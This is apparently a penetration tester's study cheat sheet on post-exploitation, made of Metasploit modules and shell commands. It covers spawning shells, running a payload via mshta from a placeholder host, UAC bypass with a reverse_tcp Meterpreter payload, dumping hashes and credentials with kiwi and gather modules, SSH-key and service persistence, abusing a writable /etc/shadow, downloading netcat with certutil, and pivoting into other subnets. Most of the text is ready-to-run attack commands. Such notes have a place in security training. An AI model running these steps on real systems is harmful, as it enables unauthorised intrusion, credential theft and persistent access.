# Phase Three - Post Exploitation

## Shells

HTA_SERVER

``` msfconsole>use hta_server``` (starts http server and serves payload)
- from elevated cmd.exe run ``` mshta.exe hxxp://IP_ADDRESS/payload.hta```
- python -c 'import pty; pty.spawn("/bin/bash")'
- /bin/bash -i

MS-VENOM PAYLOAD
- Have shell but not bash. We can upgrade by using ms venom to create a payload to call back to local machine on lport. Create payload, upload to system and run.

## Windows Post-Ex - You hacked a windows box, now...
- Net users
- Net user administrator
- Net localgroup
- Net localgroup administrator

- use post/windows/gather/win_privs
- post/windows/gather/enum_logged_on_users
- post/windows/gather/checkvm
- post/windows/gather/enum_applications
- post/windows/gather/enum_av_excluded
- post/windows/gather/enum_computers
- post/windows/gather/enum_shares
- Enable RDP ```>getgui```

## Linux Post-Ex - You hacked a linux box, now...
- Meterpreter - getudi (Who are we)
- Meterpreter - sysinfo (computer name, OS)
- Shell - whoami
- Shell - ifconfig
- Shell - Cat /etc/network
- Shell - Cat /etc/hosts
- Shell - Cat /etc/resolv.conf
- Shell - cat /etc/passwd
- Shell - crontab -l
- Shell - ps aux

- Check sudo capability ``` sudo -l```
- post/linux/gather/enum_configs
- post/multi/gather/env
- post/linux/gather/enum_network
- post/linux/gather/enum_protections 5. post/linux/gather/enum_system
- post/linux/gather/checkcontainer
- post/linux/gather/checkvm
- post/linux/gather/enum_users_history 9. post/multi/manage/system_session 10. post/linux/manage/download_exec

<br>
 
- post/multi/gather/ssh_creds
- post/multi/gather/docker_creds
- post/linux/gather/hashdump (will unshadow SHADOW file)
- post/linux/gather/ecryptfs_creds
    - Description:
  This module will collect the contents of all users' .ecrypts 
  directories on the targeted machine. Collected "wrapped-passphrase" 
  files can be cracked with John the Ripper (JtR) to recover "mount 
  passphrases".

- post/linux/gather/enum_psk (like WIFI PSK)
- post/linux/gather/enum_xchat (IRC chat program, data harvesting)
- post/linux/gather/phpmyadmin_credsteal
- post/linux/gather/pptpd_chap_secrets
    - Description:
  This module collects PPTP VPN information such as client, server, 
  password, and IP from your target server's chap-secrets file.
- 

## Windows Bypass UAC - Get SYSTEM
- ``` use exploit/windows/local/bypassuac_injection```
```
set session 1
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit
```

## Dump Hashes - Kiwi
``` >load kiwi```
```
creds_all
lsa_dump_sam
lsa_dump_secrets
```
## Crack Windows hashes
- auxiliary/analyze/crack_windows

## Persistence 
```exploit/windows/local/persistence_service```
- post/linux/manage/sshkey_persistence (Add SSH Keys to users directories)

## Linux Priv esc
- Looks for Cron jobs, scripts, and Python scripts. ps aux
- chkrootkit is a known priv esc point
- ``` exploit/unix/local/chkrootkit```
- The following command will look for files (and not symlinks etc) which is world writable. Command:â€‹ ``` find / -not -type l -perm -o+w```(The /etc/shadow maybe writable, Use openssl to generate a password entry.
 ```openssl passwd -1 -salt abc password```)
- Check if man utility is running as root, can priv esc shell.

## Download files
- ``` python3 -m http.server 80```
- ``` python -m SimpleHTTPServer 80```
- ``` certutil -urlcache -f hxxp://10.10.3.3/nc.exe nc.exe```
- ``` wget hxxp://IP_ADDRESS/FILE FILENAME```


## POST Exploit command dump
```
Getuid - meterpreter
sysinfo - meterpreter
getuid - meterpreter
getpid - meterpreter
getprivs - windows command?
whoami
whoami /priv
Net users
Net user administrator
Net localgroup
Net localgroup administrator
Route print
Netstat -ano
Net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST
groups root
who
lastlog
Ip a s
Cat /etc/network
Cat /etc/hosts
Cat /etc/resolv.conf
```

## Pivoting
- ifconfig to identify multiple networks.
- ``` >run autoroute -s 192.159.247.0 -n 255.255.255.0``` (add subnet)
- ``` >run autoroute -s 192.159.247.0/24``` (add subnet)
- ``` >portwd add -l 1234 -p 80 -r 192.159.247.2```
- ``` >portscan/tcp set RHOSTS 192.159.247.3-10 set PORT 80, 8080, 445, 22```
- ``` nmap -sV -T4 -p 1234 localhost```
- Tools from msfconsole will be able to access second box directly using native IP and PORT, as the above example with portscan. This will automatically be tunnelled through the session route.
native tools outside msfconsole will use the local socket port 1234 local host, as the above nmap example.


